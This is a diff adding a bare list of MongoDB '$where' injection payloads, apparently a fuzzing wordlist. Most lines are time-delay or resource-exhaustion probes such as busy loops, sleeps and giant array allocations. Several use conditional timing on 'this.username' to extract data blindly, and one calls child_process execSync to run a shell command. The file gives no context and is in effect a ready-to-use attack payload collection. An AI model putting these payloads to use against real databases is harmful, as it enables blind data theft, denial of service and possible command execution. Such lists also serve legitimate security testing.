@@ -1,0 +1,43 @@
+{$where: "var d=new Date();while(new Date()-d<5000){};return true"}
+{$where: "for(var i=0;i<100000000;i++){};return true"}
+{$where: "var start=Date.now();while(Date.now()-start<5000){};return true"}
+{$where: "var arr=[];for(var i=0;i<1000000;i++)arr.push(i);return true"}
+{$where: "JSON.parse(JSON.stringify(new Array(1000000).fill(0)));return true"}
+{$where: "new Array(1000000).reduce((a,b)=>a+b,0);return true"}
+{$where: "Array.from({length:1000000},(_,i)=>i).length;return true"}
+{$where: "var s='';for(var i=0;i<100000;i++)s+='x';return true"}
+{$where: "''.padEnd(1000000,'x');return true"}
+{$where: "''.repeat(1000000);return true"}
+{$where: "Math.hypot(...new Array(1000).fill(1));return true"}
+{$where: "eval('1'.repeat(10000));return true"}
+{$where: "new Function('0'.repeat(10000))();return true"}
+{$where: "Function('return '.repeat(10000)+'true')();return true"}
+{$where: "setTimeout(()=>{},5000);return true"}
+{$where: "sleep=require('child_process').execSync;sleep('sleep 5');return true"}
+{$where: "if(this.username&&this.username[0]=='a'){var d=new Date();while(new Date()-d<2000){}};return true"}
+{$where: "if(this.username&&this.username.charCodeAt(0)==97){for(var i=0;i<100000000;i++){}};return true"}
+{$where: "if(this.username&&this.username.indexOf('admin')!=-1){var s=Date.now();while(Date.now()-s<3000){}};return true"}
+{$where: "switch(this.username&&this.username[0]){case 'a':for(;;)break;default:return true}"}
+{$where: "this.username&&this.username.match(/^a/)&&eval('1'.repeat(1000000))||true"}
+{$where: "this.username&&this.username[0]>'m'&&new Array(100000000).fill().map((_,i)=>i)||true"}
+{$where: "var start=performance.now();while(performance.now()-start<1000){};return true"}
+{$where: "var i=0;while(i++<1000000000){};return true"}
+{$where: "for(var i=0;i<1e9;i++){Math.random()};return true"}
+{$where: "var arr=new Array(10000000);arr.fill(0).map(Math.random);return true"}
+{$where: "Object.create(null,{length:{value:10000000}});return true"}
+{$where: "new Proxy({},{get:()=>{for(var i=0;i<10000000;i++){}}});return true"}
+{$where: "Reflect.construct(Array,[10000000]);return true"}
+{$where: "Atomics.wait(new Int32Array(new SharedArrayBuffer(4)),0,0,5000);return true"}
+{$where: "new Promise(r=>setTimeout(r,5000)).then(()=>true);return true"}
+{$where: "async()=>{await new Promise(r=>setTimeout(r,5000));return true}()"}
+{$where: "import('data:text/javascript,for(let i=0;i<1e9;i++){}').then(()=>true);return true"}
+{$where: "Worker?new Worker('data:text/javascript,for(;;){}'):true"}
+{$where: "requestAnimationFrame?new Promise(r=>requestAnimationFrame(()=>{for(let i=0;i<1e8;i++){};r()})):true"}
+{$where: "setImmediate?new Promise(r=>setImmediate(()=>{for(let i=0;i<1e8;i++){};r()})):true"}
+{$where: "queueMicrotask(()=>{for(let i=0;i<1e8;i++){}});return true"}
+{$where: "new FinalizationRegistry(()=>{}).register({});for(let i=0;i<1e8;i++){};return true"}
+{$where: "WeakRef&&new WeakRef({}).deref();for(let i=0;i<1e8;i++){};return true"}
+{$where: "new ArrayBuffer(1000000000);return true"}
+{$where: "new SharedArrayBuffer(1000000000);return true"}
+{$where: "new Float64Array(100000000);return true"}
+{$where: "crypto&&crypto.getRandomValues(new Uint8Array(10000000));return true"}
